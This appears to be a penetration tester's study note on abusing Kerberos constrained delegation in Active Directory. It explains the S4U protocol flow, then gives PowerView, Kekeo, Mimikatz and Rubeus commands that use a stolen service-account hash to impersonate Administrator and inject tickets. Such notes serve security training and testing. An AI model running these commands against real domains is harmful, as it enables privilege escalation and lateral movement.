---
tags:
  - privesc
title:
  - Constrained Delegation
---
- When enabled on a service account, it allows access to only specific services on specified computers as a user.
- A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.
- To impersonate a user, **Service for User (S4U)** extension is used which provides two extensions:
	- Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute.
	- Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user. Which second service is controlled by msDS-AllowedToDelegateTo attribute. This attribute contains a list of SPNs to which the user tokens can be forwarded to.

![[Constrained_Delegation.svg]]
1. A user authenticates to the web service (running with a service account) using a non-[[active-directory/notes/Kerberos]] compatible authentication mechanism
2. The web service requests a ticket from the KDC for the user's account without supplying a password, as the service account
3. The KDC checks the service account's userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that the user's account is not blocked for delegation. If OK, it returns a forwardable ticket for the user's account (S4U2Self)
4. The service then passes this ticket back to the KDC and requests a service ticket for the `CIFS/computer-name-domain-name-fqdn` service
5. The KDC checks the msDS-AllowedToDelegateTo field on the service account. If the service is listed, it will return a service ticket for the respective domain name (S4U2Proxy)
6. The web service can now authenticate to the CIFS on computer-name as the user using the supplied TGS.

In short, user requests authentication, service account checks if the user is not blocked for delegation with the DC, receives the ticket from DC, then the ticket is sent back with a SPN attached to request a TGS, and then the KDC checks whether the service account can request that service or not in msDS-AllowedToDelegateTo. TGS is returned after it checks whether the service that was requested is actually listed. Finally, the user is authenticated.

To abuse constrained delegation in this scenario, we need to have access to the service account. If we have access to that account, it is possible to access services listed in msDS-AllowedToDelegateTo of the service account as **any** user.

#### Enumerate users and computers with constrained delegation enabled

```powershell title:"Enumerate users and computers with constrained delegation enabled (PowerView)"
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

```powershell title:"Enumerate users and computers with constrained delegation enabled (ActiveDirectory Module)"
Get-ADObject -Filter {msDS-AllowedToDelegateto -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### Abusing with Kekeo

Either plaintext password or NTLM hash/AES keys is required. Assuming we have access to the service account's hash.

```batch title:"Request TGT"
kekeo# tgt::ask /user:service_account /domain:domain.name /rc4:<ntlm_hash>
```

```batch title:"Request TGS"
kekeo# tgs::s4u /tgt:service_account_tgt.kirbi /user:Administrator@domain.name /service:cifs/computer-name-fqdn
```

```powershell title:"Inject the ticket"
Invoke-MimiKatz -Command '"kerberos::ptt TGS.kirbi"'
```

#### Abusing with Rubeus

```batch title:"Request TGT and TGS in a single command"
Rubeus.exe s4u /user:service_account /aes256:<aes256_key> /impersonateuser:Administrator /msdsspn:CIFS/computer-name-fqdn /altservice:ldap /ptt
```

Another interesting issue in Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. This is huge as it allows access to many interesting services when the delegation may be for a non-intrusive service.

